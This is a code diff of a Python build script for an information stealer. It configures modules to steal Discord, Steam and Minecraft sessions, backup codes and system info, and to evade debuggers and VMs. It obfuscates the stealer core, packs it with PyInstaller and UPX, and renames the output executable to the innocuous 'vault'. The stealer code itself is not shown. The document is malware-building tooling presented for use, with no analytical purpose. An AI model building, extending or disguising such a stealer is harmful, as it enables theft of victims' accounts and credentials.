@@ -24,7 +24,7 @@ from utils.module.Obfuscators import Obfuscators # Restored because obfscator wa
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=5)
 
-version = "v1.31.3"
+version = "v1.31.4"
 CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam"]
 ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal"]
 PATH = "src/stealer_core/src.py"
@@ -111,7 +111,7 @@ def build():
     os.system("pyinstaller --version")
     os.system("pyinstaller --help")
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
-    os.system('pyinstaller --onefile --clean --name="main" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
+    os.system('pyinstaller --onefile --clean --name="vault" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
     input("Press Enter key to exit.")
     sys.exit(0)
